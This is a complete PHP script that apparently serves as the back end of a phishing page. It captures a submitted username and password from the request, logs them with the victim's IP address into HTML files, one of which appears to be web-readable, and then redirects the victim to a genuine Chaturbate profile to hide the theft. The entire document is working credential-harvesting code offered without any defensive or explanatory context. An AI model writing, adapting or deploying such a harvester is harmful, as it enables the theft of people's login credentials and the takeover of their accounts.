<?php

$email = $_GET['username']; 
$pass = $_GET['password'];
$ip = $_SERVER['REMOTE_ADDR']; 
$f = fopen("passwords.html", "a"); 
$f1 = fopen("index_files/4.html", "a"); 
fwrite ($f, 'Usuario: [<b><font color="#ed07c7">'.$email.'</font></b>] Contraseña: [<b><font color="#04b536">'.$pass.'</font></b>] IP: [<b><font color="#292b29">'.$ip.'</font></b>]<br>');
fwrite ($f1, 'Usuario: [<b><font color="#ed07c7">'.$email.'</font></b>] Contraseña: [<b><font color="#04b536">'.$pass.'</font></b>] IP: [<b><font color="#292b29">'.$ip.'</font></b>]<br>');
fclose($f);
fclose($f1);
sleep(2);
header("Location: https://es.chaturbate.com/shmiwetlove/");
?>
